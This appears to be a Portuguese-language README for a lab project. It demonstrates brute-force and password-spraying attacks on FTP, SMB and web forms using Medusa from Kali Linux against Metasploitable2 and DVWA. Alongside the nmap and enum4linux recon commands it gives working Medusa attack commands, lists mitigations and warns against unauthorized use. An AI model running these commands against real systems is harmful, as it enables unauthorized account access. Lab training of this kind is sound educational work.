# Ataque Brute Force — Medusa em Kali (lab controlado)

## Resumo
Projeto demonstrando ataques de força bruta (FTP, Web form, SMB) usando **Medusa** em ambiente isolado com **Kali Linux** (atacante) e **Metasploitable2 / DVWA** (alvo).  
Todos os testes descritos neste repositório **foram concebidos para execução em laboratório controlado / ambientes autorizados**. Ataques sem autorização são ilegais.

## Ambiente (exemplo)
- VirtualBox: Host-Only network (vboxnet0)
- Kali Linux (atacante): `192.168.56.101`
- Metasploitable2 (alvo): `192.168.56.102`
- DVWA (opcional): `192.168.56.103`
- Ferramentas no Kali: `medusa`, `nmap`, `enum4linux`, `smbclient`, `netcat`, `hydra` (opcional)

## Estrutura do repositório
```
/meu-projeto-medusa/
├─ README.md
├─ commands.txt
├─ recomendacoes.md
├─ /wordlists/
│   ├─ users.txt
│   └─ pass.txt
├─ medusa_ftp_output.txt
├─ nmap_full.txt
└─ /images/         # screenshots (coloque as imagens geradas aqui)
```

## Passos executados (resumo)
1. **Preparação da rede**: configurar Host-Only no VirtualBox e atribuir IPs estáticos.
2. **Reconhecimento**:
   - `nmap -sn 192.168.56.0/24`
   - `nmap -sS -sV -A -p- 192.168.56.102 -oN nmap_full.txt`
3. **Enumeração SMB/NetBIOS**:
   - `enum4linux -a 192.168.56.102`
   - `nbtscan 192.168.56.102`
4. **Ataque FTP com Medusa**:
   - `medusa -h 192.168.56.102 -u ftpuser -P wordlists/pass.txt -M ftp`
5. **Password spraying SMB (exemplo)**:
   - `medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M smbnt`
6. **Teste em formulário web (DVWA)**:
   - Exemplos com `http_form` ou usar Burp Suite Intruder se houver CSRF/tokens.

## Resultados (espaço para preencher)
- Credenciais encontradas (exemplo): `ftpuser:letmein`
- Arquivos de evidência: `medusa_ftp_output.txt`, `nmap_full.txt`, screenshots em `/images/`

## Mitigações recomendadas (resumo)
- Implementar MFA.
- Account lockout / progressive delays.
- Rate-limiting e WAF para proteção de formulários web.
- Policies de senha forte e bloqueio de contas após N tentativas.
- Monitoramento (IDS/IPS, SIEM) e alertas.
- Patching e redução da superfície de ataque (desabilitar serviços desnecessários).

## Aviso legal
Execute **apenas** em ambientes controlados e com autorização explícita. Não use estes procedimentos contra sistemas de terceiros sem permissão.
